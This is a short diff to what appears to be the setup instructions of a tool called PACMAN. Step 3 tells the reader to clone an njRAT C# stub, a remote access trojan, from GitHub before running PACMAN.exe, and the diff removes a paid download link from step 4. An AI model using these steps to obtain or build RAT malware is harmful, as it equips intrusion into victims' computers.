@@ -30,7 +30,7 @@ IMPORTANT! pip install throwbin
 1. pip install -r requirements.txt
 2. Donwload & install python3 ('https://www.python.org/downloads/')
 3. Download 'njRAT C# Stub' from github ('git clone https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp')
-4. Download the tool ('https://sellix.io/product/5fbaf75c797c5')
+4. Download the tool
 5. Unzip the file
 6. Open the PACMAN.exe file
 7. Make sure that your python3 path is added to Environment Variables
